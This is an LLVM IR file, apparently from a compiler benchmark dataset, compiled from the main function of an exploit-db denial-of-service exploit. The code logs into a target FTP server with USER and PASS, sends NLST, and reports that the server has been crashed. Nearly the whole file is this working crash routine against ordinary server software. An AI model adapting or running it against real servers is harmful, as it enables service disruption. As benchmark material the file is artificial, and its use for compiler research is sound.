; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_8294.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_8294.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"[+]Connect to Server %s\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [18 x i8] c"[-]FAILED SOCKET\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"[-]Send Request USER\09\09[FAILED]\0A\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"[-]Send Request PASS\09\09[FAILED]\0A\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"NLST\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [32 x i8] c"[-]Send Request NLST\09\09[FAILED]\0A\00", align 1
@.str.8 = private unnamed_addr constant [22 x i8] c"[-]Connect\09\09[FAILED]\0A\00", align 1
@.str.9 = private unnamed_addr constant [30 x i8] c"[+]Done! %s has been Crashed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca [50 x i8], align 16
  %13 = alloca [200 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 4
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @syntax(i8* %19)
  br label %21

21:                                               ; preds = %16, %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 2
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @atoi(i8* %24)
  store i32 %25, i32* %6, align 4
  store i32 12, i32* %10, align 4
  %26 = load i32, i32* @AF_INET, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %26, i32* %27, align 4
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @inet_addr(i8* %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i32 0, i32 0
  store i32 %31, i32* %33, align 4
  %34 = load i32, i32* %6, align 4
  %35 = call i32 @htons(i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i32 %35, i32* %36, align 4
  %37 = load i32, i32* @stdout, align 4
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i32, i8*, ...) @fprintf(i32 %37, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i8* %40)
  %42 = load i32, i32* @AF_INET, align 4
  %43 = load i32, i32* @SOCK_STREAM, align 4
  %44 = call i32 @socket(i32 %42, i32 %43, i32 0)
  store i32 %44, i32* %8, align 4
  %45 = load i32, i32* %8, align 4
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %50

47:                                               ; preds = %21
  %48 = load i32, i32* @stderr, align 4
  %49 = call i32 (i32, i8*, ...) @fprintf(i32 %48, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %136

50:                                               ; preds = %21
  %51 = load i32, i32* %8, align 4
  %52 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 %53)
  store i32 %54, i32* %9, align 4
  %55 = load i32, i32* %9, align 4
  %56 = icmp ne i32 %55, -1
  br i1 %56, label %57, label %123

57:                                               ; preds = %50
  %58 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %59 = call i32 @memset(i8* %58, i32 0, i32 200)
  %60 = load i32, i32* %8, align 4
  %61 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %62 = call i32 @recv(i32 %60, i8* %61, i32 200, i32 0)
  %63 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 3
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 (i8*, i8*, ...) @sprintf(i8* %63, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* %66)
  %68 = load i32, i32* %8, align 4
  %69 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %70 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %71 = call i32 @strlen(i8* %70)
  %72 = call i32 @send(i32 %68, i8* %69, i32 %71, i32 0)
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %74, label %79

74:                                               ; preds = %57
  %75 = load i32, i32* @stderr, align 4
  %76 = call i32 (i32, i8*, ...) @fprintf(i32 %75, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %77 = load i32, i32* %8, align 4
  %78 = call i32 @shutdown(i32 %77, i32 1)
  store i32 1, i32* %3, align 4
  br label %136

79:                                               ; preds = %57
  %80 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %81 = call i32 @memset(i8* %80, i32 0, i32 200)
  %82 = load i32, i32* %8, align 4
  %83 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %84 = call i32 @recv(i32 %82, i8* %83, i32 200, i32 0)
  br label %85

85:                                               ; preds = %79
  %86 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %87 = load i8**, i8*** %5, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 4
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 (i8*, i8*, ...) @sprintf(i8* %86, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i8* %89)
  %91 = load i32, i32* %8, align 4
  %92 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %93 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %94 = call i32 @strlen(i8* %93)
  %95 = call i32 @send(i32 %91, i8* %92, i32 %94, i32 0)
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %102

97:                                               ; preds = %85
  %98 = load i32, i32* @stderr, align 4
  %99 = call i32 (i32, i8*, ...) @fprintf(i32 %98, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0))
  %100 = load i32, i32* %8, align 4
  %101 = call i32 @shutdown(i32 %100, i32 1)
  store i32 1, i32* %3, align 4
  br label %136

102:                                              ; preds = %85
  %103 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %104 = call i32 @memset(i8* %103, i32 0, i32 200)
  %105 = load i32, i32* %8, align 4
  %106 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %107 = call i32 @recv(i32 %105, i8* %106, i32 200, i32 0)
  br label %108

108:                                              ; preds = %102
  %109 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %110 = call i32 (i8*, i8*, ...) @sprintf(i8* %109, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  %111 = load i32, i32* %8, align 4
  %112 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %113 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %114 = call i32 @strlen(i8* %113)
  %115 = call i32 @send(i32 %111, i8* %112, i32 %114, i32 0)
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %117, label %122

117:                                              ; preds = %108
  %118 = load i32, i32* @stderr, align 4
  %119 = call i32 (i32, i8*, ...) @fprintf(i32 %118, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.7, i64 0, i64 0))
  %120 = load i32, i32* %8, align 4
  %121 = call i32 @shutdown(i32 %120, i32 1)
  store i32 1, i32* %3, align 4
  br label %136

122:                                              ; preds = %108
  br label %128

123:                                              ; preds = %50
  %124 = load i32, i32* @stderr, align 4
  %125 = call i32 (i32, i8*, ...) @fprintf(i32 %124, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.8, i64 0, i64 0))
  %126 = load i32, i32* %8, align 4
  %127 = call i32 @shutdown(i32 %126, i32 1)
  store i32 1, i32* %3, align 4
  br label %136

128:                                              ; preds = %122
  %129 = load i32, i32* %8, align 4
  %130 = call i32 @shutdown(i32 %129, i32 1)
  %131 = load i32, i32* @stdout, align 4
  %132 = load i8**, i8*** %5, align 8
  %133 = getelementptr inbounds i8*, i8** %132, i64 1
  %134 = load i8*, i8** %133, align 8
  %135 = call i32 (i32, i8*, ...) @fprintf(i32 %131, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.9, i64 0, i64 0), i8* %134)
  store i32 0, i32* %3, align 4
  br label %136

136:                                              ; preds = %128, %123, %117, %97, %74, %47
  %137 = load i32, i32* %3, align 4
  ret i32 %137
}

declare dso_local i32 @syntax(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @shutdown(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
